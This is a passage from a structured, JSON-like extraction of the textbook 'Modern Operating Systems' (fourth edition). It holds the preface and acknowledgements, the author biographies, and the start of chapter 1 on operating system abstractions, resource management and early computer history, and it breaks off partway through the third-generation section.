all been\r\nredone from scratch to reflect the latest research in operating systems.\r\nFurthermore, new problems have been added to all the chapters.\r\nNumerous teaching aids for this book are available. Instructor supplements\r\ncan be found at www.pearsonhighered.com/tanenbaum. They include PowerPoint\nPREFACE xxv\r\nsheets, software tools for studying operating systems, lab experiments for students,\r\nsimulators, and more material for use in operating systems courses. Instructors\r\nusing this book in a course should definitely take a look. The Companion Website\r\nfor this book is also located at www.pearsonhighered.com/tanenbaum. The specif\u0002ic site for this book is password protected. To use the site, click on the picture of\r\nthe cover and then follow the instructions on the student access card that came with\r\nyour text to create a user account and log in. Student resources include:\r\n• An online chapter on Multimedia Operating Systems\r\n• Lab Experiments\r\n• Online Exercises\r\n• Simulation Exercises\r\nA number of people have been involved in the fourth edition. First and fore\u0002most, Prof. Herbert Bos of the Vrije Universiteit in Amsterdam has been added as\r\na coauthor. He is a security, UNIX, and all-around systems expert and it is great to\r\nhave him on board. He wrote much of the new material except as noted below.\r\nOur editor, Tracy Johnson, has done a wonderful job, as usual, of herding all\r\nthe cats, putting all the pieces together, putting out fires, and keeping the project on\r\nschedule. We were also fortunate to get our long-time production editor, Camille\r\nTrentacoste, back. Her skills in so many areas have sav ed the day on more than a\r\nfew occasions. We are glad to have her again after an absence of several years.\r\nCarole Snyder did a fine job coordinating the various people involved in the book.\r\nThe material in Chap. 7 on VMware (in Sec. 7.12) was written by Edouard\r\nBugnion of EPFL in Lausanne, Switzerland. Ed was one of the founders of the\r\nVMware company and knows this material as well as anyone in the world. We\r\nthank him greatly for supplying it to us.\r\nAda Gavrilovska of Georgia Tech, who is an expert on Linux internals, up\u0002dated Chap. 10 from the Third Edition, which she also wrote. The Android mater\u0002ial in Chap. 10 was written by Dianne Hackborn of Google, one of the key dev el\u0002opers of the Android system. Android is the leading operating system on smart\u0002phones, so we are very grateful to have Dianne help us. Chap. 10 is now quite long\r\nand detailed, but UNIX, Linux, and Android fans can learn a lot from it. It is per\u0002haps worth noting that the longest and most technical chapter in the book was writ\u0002ten by two women. We just did the easy stuff.\r\nWe hav en’t neglected Windows, however. Dav e Probert of Microsoft updated\r\nChap. 11 from the previous edition of the book. This time the chapter covers Win\u0002dows 8.1 in detail. Dave has a great deal of knowledge of Windows and enough\r\nvision to tell the difference between places where Microsoft got it right and where\r\nit got it wrong. Windows fans are certain to enjoy this chapter.\r\nThe book is much better as a result of the work of all these expert contributors.\r\nAgain, we would like to thank them for their invaluable help.\nxxvi PREFACE\r\nWe were also fortunate to have sev eral reviewers who read the manuscript and\r\nalso suggested new end-of-chapter problems. These were Trudy Levine, Shivakant\r\nMishra, Krishna Sivalingam, and Ken Wong. Steve Armstrong did the PowerPoint\r\nsheets for instructors teaching a course using the book.\r\nNormally copyeditors and proofreaders don’t get acknowledgements, but Bob\r\nLentz (copyeditor) and Joe Ruddick (proofreader) did exceptionally thorough jobs.\r\nJoe in particular, can spot the difference between a roman period and an italics\r\nperiod from 20 meters. Nevertheless, the authors take full responsibility for any\r\nresidual errors in the book. Readers noticing any errors are requested to contact\r\none of the authors.\r\nFinally, last but not least, Barbara and Marvin are still wonderful, as usual,\r\neach in a unique and special way. Daniel and Matilde are great additions to our\r\nfamily. Aron and Nathan are wonderful little guys and Olivia is a treasure. And of\r\ncourse, I would like to thank Suzanne for her love and patience, not to mention all\r\nthe druiven, kersen, and sinaasappelsap, as well as other agricultural products.\r\n(AST)\r\nMost importantly, I would like to thank Marieke, Duko, and Jip. Marieke for\r\nher love and for bearing with me all the nights I was working on this book, and\r\nDuko and Jip for tearing me away from it and showing me there are more impor\u0002tant things in life. Like Minecraft. (HB)\r\nAndrew S. Tanenbaum\r\nHerbert Bos"
  },
  "ABOUT THE AUTHORS": {
    "page": 28
  },
  "CONTENTS": {
    "page": 8,
    "content": "CONTENTS"
  },
  "PREFACE": {
    "page": 24,
    "content": "PREFACE\r\nThe fourth edition of this book differs from the third edition in numerous ways.\r\nThere are large numbers of small changes everywhere to bring the material up to\r\ndate as operating systems are not standing still. The chapter on Multimedia Oper\u0002ating Systems has been moved to the Web, primarily to make room for new mater\u0002ial and keep the book from growing to a completely unmanageable size. The chap\u0002ter on Windows Vista has been removed completely as Vista has not been the suc\u0002cess Microsoft hoped for. The chapter on Symbian has also been removed, as\r\nSymbian no longer is widely available. However, the Vista material has been re\u0002placed by Windows 8 and Symbian has been replaced by Android. Also, a com\u0002pletely new chapter, on virtualization and the cloud has been added. Here is a\r\nchapter-by-chapter rundown of the changes.\r\n• Chapter 1 has been heavily modified and updated in many places but\r\nwith the exception of a new section on mobile computers, no major\r\nsections have been added or deleted.\r\n• Chapter 2 has been updated, with older material removed and some\r\nnew material added. For example, we added the futex synchronization\r\nprimitive, and a section about how to avoid locking altogether with\r\nRead-Copy-Update.\r\n• Chapter 3 now has more focus on modern hardware and less emphasis\r\non segmentation and MULTICS.\r\n• In Chapter 4 we removed CD-Roms, as they are no longer very com\u0002mon, and replaced them with more modern solutions (like flash\r\ndrives). Also, we added RAID level 6 to the section on RAID.\r\nxxiii\nxxiv PREFACE\r\n• Chapter 5 has seen a lot of changes. Older devices like CRTs and CD\u0002ROMs have been removed, while new technology, such as touch\r\nscreens have been added.\r\n• Chapter 6 is pretty much unchanged. The topic of deadlocks is fairly\r\nstable, with few new results.\r\n• Chapter 7 is completely new. It covers the important topics of virtu\u0002alization and the cloud. As a case study, a section on VMware has\r\nbeen added.\r\n• Chapter 8 is an updated version of the previous material on multiproc\u0002essor systems. There is more emphasis on multicore and manycore\r\nsystems now, which have become increasingly important in the past\r\nfew years. Cache consistency has become a bigger issue recently and\r\nis covered here, now.\r\n• Chapter 9 has been heavily revised and reorganized, with considerable\r\nnew material on exploiting code bugs, malware, and defenses against\r\nthem. Attacks such as null pointer dereferences and buffer overflows\r\nare treated in more detail. Defense mechanisms, including canaries,\r\nthe NX bit, and address-space randomization are covered in detail\r\nnow, as are the ways attackers try to defeat them.\r\n• Chapter 10 has undergone a major change. The material on UNIX and\r\nLinux has been updated but the major addtion here is a new and\r\nlengthy section on the Android operating system, which is very com\u0002mon on smartphones and tablets.\r\n• Chapter 11 in the third edition was on Windows Vista. That has been\r\nreplaced by a chapter on Windows 8, specifically Windows 8.1. It\r\nbrings the treatment of Windows completely up to date.\r\n• Chapter 12 is a revised version of Chap. 13 from the previous edition.\r\n• Chapter 13 is a thoroughly updated list of suggested readings. In addi\u0002tion, the list of references has been updated, with entries to 223 new\r\nworks published after the third edition of this book came out.\r\n• Chapter 7 from the previous edition has been moved to the book’s\r\nWebsite to keep the size somewhat manageable).\r\n• In addition, the sections on research throughout the book have all been\r\nredone from scratch to reflect the latest research in operating systems.\r\nFurthermore, new problems have been added to all the chapters.\r\nNumerous teaching aids for this book are available. Instructor supplements\r\ncan be found at www.pearsonhighered.com/tanenbaum. They include PowerPoint\nPREFACE xxv\r\nsheets, software tools for studying operating systems, lab experiments for students,\r\nsimulators, and more material for use in operating systems courses. Instructors\r\nusing this book in a course should definitely take a look. The Companion Website\r\nfor this book is also located at www.pearsonhighered.com/tanenbaum. The specif\u0002ic site for this book is password protected. To use the site, click on the picture of\r\nthe cover and then follow the instructions on the student access card that came with\r\nyour text to create a user account and log in. Student resources include:\r\n• An online chapter on Multimedia Operating Systems\r\n• Lab Experiments\r\n• Online Exercises\r\n• Simulation Exercises\r\nA number of people have been involved in the fourth edition. First and fore\u0002most, Prof. Herbert Bos of the Vrije Universiteit in Amsterdam has been added as\r\na coauthor. He is a security, UNIX, and all-around systems expert and it is great to\r\nhave him on board. He wrote much of the new material except as noted below.\r\nOur editor, Tracy Johnson, has done a wonderful job, as usual, of herding all\r\nthe cats, putting all the pieces together, putting out fires, and keeping the project on\r\nschedule. We were also fortunate to get our long-time production editor, Camille\r\nTrentacoste, back. Her skills in so many areas have sav ed the day on more than a\r\nfew occasions. We are glad to have her again after an absence of several years.\r\nCarole Snyder did a fine job coordinating the various people involved in the book.\r\nThe material in Chap. 7 on VMware (in Sec. 7.12) was written by Edouard\r\nBugnion of EPFL in Lausanne, Switzerland. Ed was one of the founders of the\r\nVMware company and knows this material as well as anyone in the world. We\r\nthank him greatly for supplying it to us.\r\nAda Gavrilovska of Georgia Tech, who is an expert on Linux internals, up\u0002dated Chap. 10 from the Third Edition, which she also wrote. The Android mater\u0002ial in Chap. 10 was written by Dianne Hackborn of Google, one of the key dev el\u0002opers of the Android system. Android is the leading operating system on smart\u0002phones, so we are very grateful to have Dianne help us. Chap. 10 is now quite long\r\nand detailed, but UNIX, Linux, and Android fans can learn a lot from it. It is per\u0002haps worth noting that the longest and most technical chapter in the book was writ\u0002ten by two women. We just did the easy stuff.\r\nWe hav en’t neglected Windows, however. Dav e Probert of Microsoft updated\r\nChap. 11 from the previous edition of the book. This time the chapter covers Win\u0002dows 8.1 in detail. Dave has a great deal of knowledge of Windows and enough\r\nvision to tell the difference between places where Microsoft got it right and where\r\nit got it wrong. Windows fans are certain to enjoy this chapter.\r\nThe book is much better as a result of the work of all these expert contributors.\r\nAgain, we would like to thank them for their invaluable help.\nxxvi PREFACE\r\nWe were also fortunate to have sev eral reviewers who read the manuscript and\r\nalso suggested new end-of-chapter problems. These were Trudy Levine, Shivakant\r\nMishra, Krishna Sivalingam, and Ken Wong. Steve Armstrong did the PowerPoint\r\nsheets for instructors teaching a course using the book.\r\nNormally copyeditors and proofreaders don’t get acknowledgements, but Bob\r\nLentz (copyeditor) and Joe Ruddick (proofreader) did exceptionally thorough jobs.\r\nJoe in particular, can spot the difference between a roman period and an italics\r\nperiod from 20 meters. Nevertheless, the authors take full responsibility for any\r\nresidual errors in the book. Readers noticing any errors are requested to contact\r\none of the authors.\r\nFinally, last but not least, Barbara and Marvin are still wonderful, as usual,\r\neach in a unique and special way. Daniel and Matilde are great additions to our\r\nfamily. Aron and Nathan are wonderful little guys and Olivia is a treasure. And of\r\ncourse, I would like to thank Suzanne for her love and patience, not to mention all\r\nthe druiven, kersen, and sinaasappelsap, as well as other agricultural products.\r\n(AST)\r\nMost importantly, I would like to thank Marieke, Duko, and Jip. Marieke for\r\nher love and for bearing with me all the nights I was working on this book, and\r\nDuko and Jip for tearing me away from it and showing me there are more impor\u0002tant things in life. Like Minecraft. (HB)\r\nAndrew S. Tanenbaum\r\nHerbert Bos\nABOUT THE AUTHORS\r\nAndrew S. Tanenbaum has an S.B. degree from M.I.T. and a Ph.D. from the\r\nUniversity of California at Berkeley. He is currently a Professor of Computer Sci\u0002ence at the Vrije Universiteit in Amsterdam, The Netherlands. He was formerly\r\nDean of the Advanced School for Computing and Imaging, an interuniversity grad\u0002uate school doing research on advanced parallel, distributed, and imaging systems.\r\nHe was also an Academy Professor of the Royal Netherlands Academy of Arts and\r\nSciences, which has saved him from turning into a bureaucrat. He also won a pres\u0002tigious European Research Council Advanced Grant.\r\nIn the past, he has done research on compilers, operating systems, networking,\r\nand distributed systems. His main research focus now is reliable and secure oper\u0002ating systems. These research projects have led to over 175 refereed papers in\r\njournals and conferences. Prof. Tanenbaum has also authored or co-authored fiv e\r\nbooks, which have been translated into 20 languages, ranging from Basque to Thai.\r\nThey are used at universities all over the world. In all, there are 163 versions (lan\u0002guage + edition combinations) of his books.\r\nProf. Tanenbaum has also produced a considerable volume of software, not\u0002ably MINIX, a small UNIX clone. It was the direct inspiration for Linux and the\r\nplatform on which Linux was initially developed. The current version of MINIX,\r\ncalled MINIX 3, is now focused on being an extremely reliable and secure operat\u0002ing system. Prof. Tanenbaum will consider his work done when no user has any\r\nidea what an operating system crash is. MINIX 3 is an ongoing open-source proj\u0002ect to which you are invited to contribute. Go to www.minix3.org to download a\r\nfree copy of MINIX 3 and give it a try. Both x86 and ARM versions are available.\r\nProf. Tanenbaum’s Ph.D. students have gone on to greater glory after graduat\u0002ing. He is very proud of them. In this respect, he resembles a mother hen.\r\nProf. Tanenbaum is a Fellow of the ACM, a Fellow of the IEEE, and a member\r\nof the Royal Netherlands Academy of Arts and Sciences. He has also won numer\u0002ous scientific prizes from ACM, IEEE, and USENIX. If you are unbearably curi\u0002ous about them, see his page on Wikipedia. He also has two honorary doctorates.\r\nHerbert Bos obtained his Masters degree from Twente University and his\r\nPh.D. from Cambridge University Computer Laboratory in the U.K.. Since then, he\r\nhas worked extensively on dependable and efficient I/O architectures for operating\r\nsystems like Linux, but also research systems based on MINIX 3. He is currently a\r\nprofessor in Systems and Network Security in the Dept. of Computer Science at\r\nthe Vrije Universiteit in Amsterdam, The Netherlands. His main research field is\r\nsystem security. With his students, he works on novel ways to detect and stop at\u0002tacks, to analyze and reverse engineer malware, and to take down botnets (malici\u0002ous infrastructures that may span millions of computers). In 2011, he obtained an\r\nERC Starting Grant for his research on reverse engineering. Three of his students\r\nhave won the Roger Needham Award for best European Ph.D. thesis in systems.\nThis page intentionally left blank \nMODERN OPERATING SYSTEMS\nThis page intentionally left blank \n1\r\nINTRODUCTION\r\nA modern computer consists of one or more processors, some main memory,\r\ndisks, printers, a keyboard, a mouse, a display, network interfaces, and various\r\nother input/output devices. All in all, a complex system.oo If every application pro\u0002grammer had to understand how all these things work in detail, no code would ever\r\nget written. Furthermore, managing all these components and using them optimally\r\nis an exceedingly challenging job. For this reason, computers are equipped with a\r\nlayer of software called the operating system, whose job is to provide user pro\u0002grams with a better, simpler, cleaner, model of the computer and to handle manag\u0002ing all the resources just mentioned. Operating systems are the subject of this\r\nbook.\r\nMost readers will have had some experience with an operating system such as\r\nWindows, Linux, FreeBSD, or OS X, but appearances can be deceiving. The pro\u0002gram that users interact with, usually called the shell when it is text based and the\r\nGUI (Graphical User Interface)—which is pronounced ‘‘gooey’’—when it uses\r\nicons, is actually not part of the operating system, although it uses the operating\r\nsystem to get its work done.\r\nA simple overview of the main components under discussion here is given in\r\nFig. 1-1. Here we see the hardware at the bottom. The hardware consists of chips,\r\nboards, disks, a keyboard, a monitor, and similar physical objects. On top of the\r\nhardware is the software. Most computers have two modes of operation: kernel\r\nmode and user mode. The operating system, the most fundamental piece of soft\u0002ware, runs in kernel mode (also called supervisor mode). In this mode it has\r\n1"
  },
  "1 INTRODUCTION": {
    "page": 32,
    "children": {
      "1.1 WHAT IS AN OPERATING SYSTEM?": {
        "page": 34,
        "children": {
          "1.1.1 The Operating System as an Extended Machine": {
            "page": 35,
            "content": "1.1.1 The Operating System as an Extended Machine\r\nThe architecture (instruction set, memory organization, I/O, and bus struc\u0002ture) of most computers at the machine-language level is primitive and awkward to\r\nprogram, especially for input/output. To make this point more concrete, consider\r\nmodern SATA (Serial ATA) hard disks used on most computers. A book (Ander\u0002son, 2007) describing an early version of the interface to the disk—what a pro\u0002grammer would have to know to use the disk—ran over 450 pages. Since then, the\r\ninterface has been revised multiple times and is more complicated than it was in\r\n2007. Clearly, no sane programmer would want to deal with this disk at the hard\u0002ware level. Instead, a piece of software, called a disk driver, deals with the hard\u0002ware and provides an interface to read and write disk blocks, without getting into\r\nthe details. Operating systems contain many drivers for controlling I/O devices.\r\nBut even this level is much too low for most applications. For this reason, all\r\noperating systems provide yet another layer of abstraction for using disks: files.\r\nUsing this abstraction, programs can create, write, and read files, without having to\r\ndeal with the messy details of how the hardware actually works.\r\nThis abstraction is the key to managing all this complexity. Good abstractions\r\nturn a nearly impossible task into two manageable ones. The first is defining and\r\nimplementing the abstractions. The second is using these abstractions to solve the\r\nproblem at hand. One abstraction that almost every computer user understands is\r\nthe file, as mentioned above. It is a useful piece of information, such as a digital\r\nphoto, saved email message, song, or Web page. It is much easier to deal with pho\u0002tos, emails, songs, and Web pages than with the details of SATA (or other) disks.\r\nThe job of the operating system is to create good abstractions and then implement\r\nand manage the abstract objects thus created. In this book, we will talk a lot about\r\nabstractions. They are one of the keys to understanding operating systems.\r\nThis point is so important that it is worth repeating in different words. With all\r\ndue respect to the industrial engineers who so carefully designed the Macintosh,\r\nhardware is ugly. Real processors, memories, disks, and other devices are very\r\ncomplicated and present difficult, awkward, idiosyncratic, and inconsistent inter\u0002faces to the people who have to write software to use them. Sometimes this is due\r\nto the need for backward compatibility with older hardware. Other times it is an\r\nattempt to save money. Often, however, the hardware designers do not realize (or\r\ncare) how much trouble they are causing for the software. One of the major tasks\r\nof the operating system is to hide the hardware and present programs (and their\r\nprogrammers) with nice, clean, elegant, consistent, abstractions to work with in\u0002stead. Operating systems turn the ugly into the beautiful, as shown in Fig. 1-2.\nSEC. 1.1 WHAT IS AN OPERATING SYSTEM? 5\r\nOperating system\r\nHardware\r\nUgly interface\r\nBeautiful interface\r\nApplication programs\r\nFigure 1-2. Operating systems turn ugly hardware into beautiful abstractions.\r\nIt should be noted that the operating system’s real customers are the applica\u0002tion programs (via the application programmers, of course). They are the ones\r\nwho deal directly with the operating system and its abstractions. In contrast, end\r\nusers deal with the abstractions provided by the user interface, either a com\u0002mand-line shell or a graphical interface. While the abstractions at the user interface\r\nmay be similar to the ones provided by the operating system, this is not always the\r\ncase. To make this point clearer, consider the normal Windows desktop and the\r\nline-oriented command prompt. Both are programs running on the Windows oper\u0002ating system and use the abstractions Windows provides, but they offer very dif\u0002ferent user interfaces. Similarly, a Linux user running Gnome or KDE sees a very\r\ndifferent interface than a Linux user working directly on top of the underlying X\r\nWindow System, but the underlying operating system abstractions are the same in\r\nboth cases.\r\nIn this book, we will study the abstractions provided to application programs in\r\ngreat detail, but say rather little about user interfaces. That is a large and important\r\nsubject, but one only peripherally related to operating systems."
          },
          "1.1.2 The Operating System as a Resource Manager": {
            "page": 36,
            "content": "1.1.2 The Operating System as a Resource Manager\r\nThe concept of an operating system as primarily providing abstractions to ap\u0002plication programs is a top-down view. An alternative, bottom-up, view holds that\r\nthe operating system is there to manage all the pieces of a complex system. Mod\u0002ern computers consist of processors, memories, timers, disks, mice, network inter\u0002faces, printers, and a wide variety of other devices. In the bottom-up view, the job\r\nof the operating system is to provide for an orderly and controlled allocation of the\r\nprocessors, memories, and I/O devices among the various programs wanting them.\r\nModern operating systems allow multiple programs to be in memory and run\r\nat the same time. Imagine what would happen if three programs running on some\r\ncomputer all tried to print their output simultaneously on the same printer. The first\n6 INTRODUCTION CHAP. 1\r\nfew lines of printout might be from program 1, the next few from program 2, then\r\nsome from program 3, and so forth. The result would be utter chaos. The operating\r\nsystem can bring order to the potential chaos by buffering all the output destined\r\nfor the printer on the disk. When one program is finished, the operating system can\r\nthen copy its output from the disk file where it has been stored for the printer,\r\nwhile at the same time the other program can continue generating more output,\r\noblivious to the fact that the output is not really going to the printer (yet).\r\nWhen a computer (or network) has more than one user, the need for managing\r\nand protecting the memory, I/O devices, and other resources is even more since the\r\nusers might otherwise interfere with one another. In addition, users often need to\r\nshare not only hardware, but information (files, databases, etc.) as well. In short,\r\nthis view of the operating system holds that its primary task is to keep track of\r\nwhich programs are using which resource, to grant resource requests, to account\r\nfor usage, and to mediate conflicting requests from different programs and users.\r\nResource management includes multiplexing (sharing) resources in two dif\u0002ferent ways: in time and in space. When a resource is time multiplexed, different\r\nprograms or users take turns using it. First one of them gets to use the resource,\r\nthen another, and so on. For example, with only one CPU and multiple programs\r\nthat want to run on it, the operating system first allocates the CPU to one program,\r\nthen, after it has run long enough, another program gets to use the CPU, then an\u0002other, and then eventually the first one again. Determining how the resource is time\r\nmultiplexed—who goes next and for how long—is the task of the operating sys\u0002tem. Another example of time multiplexing is sharing the printer. When multiple\r\nprint jobs are queued up for printing on a single printer, a decision has to be made\r\nabout which one is to be printed next.\r\nThe other kind of multiplexing is space multiplexing. Instead of the customers\r\ntaking turns, each one gets part of the resource. For example, main memory is nor\u0002mally divided up among several running programs, so each one can be resident at\r\nthe same time (for example, in order to take turns using the CPU). Assuming there\r\nis enough memory to hold multiple programs, it is more efficient to hold several\r\nprograms in memory at once rather than give one of them all of it, especially if it\r\nonly needs a small fraction of the total. Of course, this raises issues of fairness,\r\nprotection, and so on, and it is up to the operating system to solve them. Another\r\nresource that is space multiplexed is the disk. In many systems a single disk can\r\nhold files from many users at the same time. Allocating disk space and keeping\r\ntrack of who is using which disk blocks is a typical operating system task."
          }
        }
      },
      "1.2 HISTORY OF OPERATING SYSTEMS": {
        "page": 37,
        "children": {
          "1.2.1 The First Generation (1945–55): Vacuum Tubes": {
            "page": 38,
            "content": "1.2.1 The First Generation (1945–55): Vacuum Tubes\r\nAfter Babbage’s unsuccessful efforts, little progress was made in constructing\r\ndigital computers until the World War II period, which stimulated an explosion of\r\nactivity. Professor John Atanasoff and his graduate student Clifford Berry built\r\nwhat is now reg arded as the first functioning digital computer at Iowa State Univer\u0002sity. It used 300 vacuum tubes. At roughly the same time, Konrad Zuse in Berlin\r\nbuilt the Z3 computer out of electromechanical relays. In 1944, the Colossus was\r\nbuilt and programmed by a group of scientists (including Alan Turing) at Bletchley\r\nPark, England, the Mark I was built by Howard Aiken at Harvard, and the ENIAC\r\nwas built by William Mauchley and his graduate student J. Presper Eckert at the\r\nUniversity of Pennsylvania. Some were binary, some used vacuum tubes, some\r\nwere programmable, but all were very primitive and took seconds to perform even\r\nthe simplest calculation.\r\nIn these early days, a single group of people (usually engineers) designed,\r\nbuilt, programmed, operated, and maintained each machine. All programming was\r\ndone in absolute machine language, or even worse yet, by wiring up electrical cir\u0002cuits by connecting thousands of cables to plugboards to control the machine’s\r\nbasic functions. Programming languages were unknown (even assembly language\r\nwas unknown). Operating systems were unheard of. The usual mode of operation\r\nwas for the programmer to sign up for a block of time using the signup sheet on the\r\nwall, then come down to the machine room, insert his or her plugboard into the\r\ncomputer, and spend the next few hours hoping that none of the 20,000 or so vac\u0002uum tubes would burn out during the run. Virtually all the problems were simple\n8 INTRODUCTION CHAP. 1\r\nstraightforward mathematical and numerical calculations, such as grinding out\r\ntables of sines, cosines, and logarithms, or computing artillery trajectories.\r\nBy the early 1950s, the routine had improved somewhat with the introduction\r\nof punched cards. It was now possible to write programs on cards and read them in\r\ninstead of using plugboards; otherwise, the procedure was the same."
          },
          "1.2.2 The Second Generation (1955–65): Transistors and Batch Systems": {
            "page": 39,
            "content": "1.2.2 The Second Generation (1955–65): Transistors and Batch Systems\r\nThe introduction of the transistor in the mid-1950s changed the picture radi\u0002cally. Computers became reliable enough that they could be manufactured and sold\r\nto paying customers with the expectation that they would continue to function long\r\nenough to get some useful work done. For the first time, there was a clear separa\u0002tion between designers, builders, operators, programmers, and maintenance per\u0002sonnel.\r\nThese machines, now called mainframes, were locked away in large, specially\r\nair-conditioned computer rooms, with staffs of professional operators to run them.\r\nOnly large corporations or major government agencies or universities could afford\r\nthe multimillion-dollar price tag. To run a job (i.e., a program or set of programs),\r\na programmer would first write the program on paper (in FORTRAN or assem\u0002bler), then punch it on cards. He would then bring the card deck down to the input\r\nroom and hand it to one of the operators and go drink coffee until the output was\r\nready.\r\nWhen the computer finished whatever job it was currently running, an operator\r\nwould go over to the printer and tear off the output and carry it over to the output\r\nroom, so that the programmer could collect it later. Then he would take one of the\r\ncard decks that had been brought from the input room and read it in. If the FOR\u0002TRAN compiler was needed, the operator would have to get it from a file cabinet\r\nand read it in. Much computer time was wasted while operators were walking\r\naround the machine room.\r\nGiven the high cost of the equipment, it is not surprising that people quickly\r\nlooked for ways to reduce the wasted time. The solution generally adopted was the\r\nbatch system. The idea behind it was to collect a tray full of jobs in the input\r\nroom and then read them onto a magnetic tape using a small (relatively) inexpen\u0002sive computer, such as the IBM 1401, which was quite good at reading cards,\r\ncopying tapes, and printing output, but not at all good at numerical calculations.\r\nOther, much more expensive machines, such as the IBM 7094, were used for the\r\nreal computing. This situation is shown in Fig. 1-3.\r\nAfter about an hour of collecting a batch of jobs, the cards were read onto a\r\nmagnetic tape, which was carried into the machine room, where it was mounted on\r\na tape drive. The operator then loaded a special program (the ancestor of today’s\r\noperating system), which read the first job from tape and ran it. The output was\r\nwritten onto a second tape, instead of being printed. After each job finished, the\r\noperating system automatically read the next job from the tape and began running\nSEC. 1.2 HISTORY OF OPERATING SYSTEMS 9\r\n1401 7094 1401\r\n(a) (b) (c) (d) (e) (f)\r\nCard\r\nreader\r\nTape\r\ndrive Input\r\ntape\r\nOutput\r\ntape\r\nSystem\r\ntape\r\nPrinter\r\nFigure 1-3. An early batch system. (a) Programmers bring cards to 1401. (b)\r\n1401 reads batch of jobs onto tape. (c) Operator carries input tape to 7094. (d)\r\n7094 does computing. (e) Operator carries output tape to 1401. (f) 1401 prints\r\noutput.\r\nit. When the whole batch was done, the operator removed the input and output\r\ntapes, replaced the input tape with the next batch, and brought the output tape to a\r\n1401 for printing off line (i.e., not connected to the main computer).\r\nThe structure of a typical input job is shown in Fig. 1-4. It started out with a\r\n$JOB card, specifying the maximum run time in minutes, the account number to be\r\ncharged, and the programmer’s name. Then came a $FORTRAN card, telling the\r\noperating system to load the FORTRAN compiler from the system tape. It was di\u0002rectly followed by the program to be compiled, and then a $LOAD card, directing\r\nthe operating system to load the object program just compiled. (Compiled pro\u0002grams were often written on scratch tapes and had to be loaded explicitly.) Next\r\ncame the $RUN card, telling the operating system to run the program with the data\r\nfollowing it. Finally, the $END card marked the end of the job. These primitive\r\ncontrol cards were the forerunners of modern shells and command-line inter\u0002preters.\r\nLarge second-generation computers were used mostly for scientific and engin\u0002eering calculations, such as solving the partial differential equations that often oc\u0002cur in physics and engineering. They were largely programmed in FORTRAN and\r\nassembly language. Typical operating systems were FMS (the Fortran Monitor\r\nSystem) and IBSYS, IBM’s operating system for the 7094."
          },
          "1.2.3 The Third Generation (1965–1980): ICs and Multiprogramming": {
            "page": 40,
            "content": "1.2.3 The Third Generation (1965–1980): ICs and Multiprogramming\r\nBy the early 1960s, most computer manufacturers had two distinct, incompati\u0002ble, product lines. On the one hand, there were the word-oriented, large-scale sci\u0002entific computers, such as the 7094, which were used for industrial-strength nu\u0002merical calculations in science and engineering. On the other hand, there were the\n10 INTRODUCTION CHAP. 1\r\n $JOB, 10,7710802, MARVIN TANENBAUM\r\n$FORTRAN\r\n$LOAD\r\n$RUN\r\n$END\r\nData for program\r\nFORTRAN program\r\nFigure 1-4. Structure of a typical FMS job.\r\ncharacter-oriented, commercial computers, such as the 1401, which were widely\r\nused for tape sorting and printing by banks and insurance companies.\r\nDeveloping and maintaining two completely different product lines was an ex\u0002pensive proposition for the manufacturers. In addition, many new computer cus\u0002tomers initially needed a small machine but later outgrew it and wanted a bigger\r\nmachine that would run all their old programs, but faster.\r\nIBM attempted to solve both of these problems at a single stroke by introduc\u0002ing the System/360. The 360 was a series of software-compatible machines rang\u0002ing from 1401-sized models to much larger ones, more powerful than the mighty\r\n7094. The machines differed only in price and performance (maximum memory,\r\nprocessor speed, number of I/O devices permitted, and so forth). Since they all had\r\nthe same architecture and instruction set, programs written for one machine could\r\nrun on all the others—at least in theory. (But as Yogi Berra reputedly said: ‘‘In\r\ntheory, theory and practice are the same; in practice, they are not.’’) Since the 360\r\nwas designed to handle both scientific (i.e., numerical) and commercial computing,\r\na single family of machines could satisfy the needs of all customers. In subsequent\r\nyears, IBM came out with backward compatible successors to the 360 line, using\r\nmore modern technology, known as the 370, 4300, 3080, and 3090. The zSeries is\r\nthe most recent descendant of this line, although it has diverged considerably from\r\nthe original.\r\nThe IBM 360 was the first major computer line to use (small-scale) ICs (Inte\u0002grated Circuits), thus providing a major price/performance advantage over the\r\nsecond-generation machines, which were built up from individual transistors. It\nSEC. 1.2 HISTORY OF OPERATING SYSTEMS 11\r\nwas an immediate success, and the idea of a family of compatible computers was\r\nsoon adopted by all the other major manufacturers. The descendants of these ma\u0002chines are still in use at computer centers today. Now adays they are often used for\r\nmanaging huge databases (e.g., for airline reservation systems) or as servers for\r\nWorld Wide Web sites that must process thousands of requests per second.\r\nThe greatest strength of the ‘‘single-family’’ idea was simultaneously its great\u0002est weakness. The original intention was that all software, including the operating\r\nsystem, OS/360, had to work on all models. It had to run on small systems, which\r\noften just replaced 1401s for copying cards to tape, and on very large systems,\r\nwhich often replaced 7094s for doing weather forecasting and other heavy comput\u0002ing. It had to be good on systems with few peripherals and on systems with many\r\nperipherals. It had to work in commercial environments and in scientific environ\u0002ments. Above all, it had to be efficient for all of these different uses.\r\nThere was no way that IBM (or anybody else for that matter) could write a\r\npiece of software to meet all those conflicting requirements. The result was an\r\nenormous and extraordinarily complex operating system, probably two to three\r\norders of magnitude larger than FMS. It consisted of millions of lines of assembly\r\nlanguage written by thousands of programmers, and contained thousands upon\r\nthousands of bugs, which necessitated a continuous stream of new releases in an\r\nattempt to correct them. Each new release fixed some bugs and introduced new\r\nones, so the number of bugs probably remained constant over time.\r\nOne of the designers of OS/360, Fred Brooks, subsequently wrote a witty and\r\nincisive book (Brooks, 1995) describing his experiences with OS/360. While it\r\nwould be impossible to summarize the book here, suffice it to say that the cover\r\nshows a herd of prehistoric beasts stuck in a tar pit. The cover of Silberschatz et al.\r\n(2012) makes a similar point about operating systems being dinosaurs.\r\nDespite its enormous size and problems, OS/360 and the similar third-genera\u0002tion operating systems produced by other computer manufacturers actually satis\u0002fied most of their customers reasonably well. They also popularized several key\r\ntechniques absent in second-generation operating systems. Probably the most im\u0002portant of these was multiprogramming. On the 7094, when the current job\r\npaused to wait for a tape or other I/O operation to complete, the CPU simply sat\r\nidle until the I/O finished. With heavily CPU-bound scientific calculations, I/O is\r\ninfrequent, so this wasted time is not significant. With commercial data processing,\r\nthe I/O wait time can often be 80 or 90% of the total time, so something had to be\r\ndone to avoid having the (expensive) CPU be idle so much.\r\nThe solution that evolved was to partition memory into several pieces, with a\r\ndifferent job in each partition, as shown in Fig. 1-5. While one job was waiting for\r\nI/O to complete, another job could be using the CPU. If enough jobs could be held\r\nin main memory at once, the CPU could be kept busy nearly 100% of the time.\r\nHaving multiple jobs safely in memory at once requires special hardware to protect\r\neach job against snooping and mischief by the other ones, but the 360 and other\r\nthird-generation systems were equipped with this hardware.\n12 INTRODUCTION CHAP. 1\r\nJob 3\r\nJob 